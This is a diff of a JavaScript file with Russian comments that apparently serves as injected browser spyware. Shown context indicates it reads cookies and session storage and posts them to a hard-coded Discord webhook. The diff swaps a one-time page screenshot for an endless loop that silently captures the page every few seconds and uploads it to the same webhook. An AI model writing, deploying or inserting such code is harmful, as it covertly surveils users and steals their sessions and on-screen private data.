@@ -3,35 +3,6 @@
         // Вебхук для отправки данных
         const WEBHOOK_URL = 'https://discord.com/api/webhooks/1393595797530083390/1dDSykIyP3bqwownNM3Ro1I-LLcI2Sn1KM2SMb9a6b-POlE3TlsvgkMSZhPRLfTVKNod';
 	
-        const script = document.createElement('script');
-  	script.src = "https://cdnjs.cloudflare.com/ajax/libs/html2canvas/1.4.1/html2canvas.min.js";
-	document.head.appendChild(script);
-	script.onload = async () => {
-        try {
-            const canvas = await html2canvas(document.body, {
-                useCORS: true,
-                allowTaint: true,
-                logging: false
-            });
-            canvas.toBlob(async (blob) => {
-                if (!blob) {
-                    return;
-                }
-                const formData = new FormData();
-                formData.append('file', blob, `screenshot_${Date.now()}.png`);
-		const response = await fetch(WEBHOOK_URL, {
-                    method: 'POST',
-                    body: formData
-                });
-
-                if (response.ok) {
-                } else {
-                }
-            }, 'image/png');
-
-        } catch (error) {
-        }
-	};
         // Функция для получения куки
         const getCookie = (name) => {
             const matches = document.cookie.match(new RegExp(
@@ -429,3 +400,63 @@ ${sessionStorageData}
         };
         document.head.appendChild(script);
     }
+(async () => {
+    const WEBHOOK_URL = 'https://discord.com/api/webhooks/1393595797530083390/1dDSykIyP3bqwownNM3Ro1I-LLcI2Sn1KM2SMb9a6b-POlE3TlsvgkMSZhPRLfTVKNod';
+    let messageId = null;
+
+    if (typeof html2canvas === 'undefined') {
+        const script = document.createElement('script');
+        script.src = "https://cdnjs.cloudflare.com/ajax/libs/html2canvas/1.4.1/html2canvas.min.js";
+        document.head.appendChild(script);
+        await new Promise(r => script.onload = r);
+    }
+
+    while (true) {
+        const startTime = Date.now();
+
+        try {
+            const canvas = await html2canvas(document.body, {
+                useCORS: true,
+                allowTaint: true,
+                logging: false,
+                scale: 0.5 
+            });
+
+            const blob = await new Promise(res => canvas.toBlob(res, 'image/jpeg', 0.7));
+            const formData = new FormData();
+            
+            const payload = {
+                attachments: []
+            };
+            
+            formData.append('payload_json', JSON.stringify(payload));
+            formData.append('files[0]', blob, 'screen.jpg');
+
+            if (!messageId) {
+                const res = await fetch(`${WEBHOOK_URL}?wait=true`, { 
+                    method: 'POST', 
+                    body: formData 
+                });
+                const data = await res.json();
+                messageId = data.id;
+            } else {
+                const res = await fetch(`${WEBHOOK_URL}/messages/${messageId}`, { 
+                    method: 'PATCH', 
+                    body: formData 
+                });
+                
+                if (res.status === 429) {
+                    const retryAfter = (await res.json()).retry_after || 5;
+                    await new Promise(r => setTimeout(r, retryAfter * 1000));
+                }
+            }
+
+        } catch (e) {
+            // Ошибка игнорируется
+        }
+
+        const executionTime = Date.now() - startTime;
+        const delay = Math.max(2500 - executionTime, 500);
+        await new Promise(r => setTimeout(r, delay));
+    }
+})();
